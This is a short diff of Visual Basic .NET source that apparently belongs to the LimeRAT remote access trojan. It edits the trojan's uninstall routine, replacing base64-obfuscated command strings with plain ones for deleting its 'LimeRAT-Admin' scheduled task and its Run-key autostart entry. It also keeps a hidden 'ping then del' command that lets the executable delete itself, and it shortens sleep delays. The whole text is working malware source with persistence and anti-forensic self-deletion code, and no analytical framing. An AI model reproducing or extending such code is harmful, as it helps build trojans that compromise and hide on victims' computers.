@@ -58,21 +58,19 @@
         Try
             If DROP Then
                 IO.File.SetAttributes(FullPath, IO.FileAttributes.Normal)
-                Threading.Thread.Sleep(100)
+                Threading.Thread.Sleep(50)
 
-                'schtasks /Delete /tn LimeRAT-Admin /F
-                Try : Shell(BS(Convert.FromBase64String("c2NodGFza3MgL0RlbGV0ZSAvdG4gTGltZVJBVC1BZG1pbiAvRg==")), AppWinStyle.Hide, False, -1) : Catch : End Try
-                Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey(BS(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA=="))).DeleteValue(EXE) : Catch : End Try
+                Try : Shell("schtasks /Delete /tn LimeRAT-Admin /F", AppWinStyle.Hide, False, -1) : Catch : End Try
+                Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").DeleteValue(EXE) : Catch : End Try
         End If
 
             Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & HWID)
             CriticalProcesses_Disable()
-            Threading.Thread.Sleep(100)
+            Threading.Thread.Sleep(50)
 
             MT()
 
-            'cmd.exe /c ping 0 -n 2 & del 
-            Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & FullPath & """", AppWinStyle.Hide, False, -1) 'Delete NEXE
+            Shell("cmd.exe /c ping 0 -n 2 & del " & """" & FullPath & """", AppWinStyle.Hide, False, -1)
             Environment.Exit(0)
         Catch : End Try
 
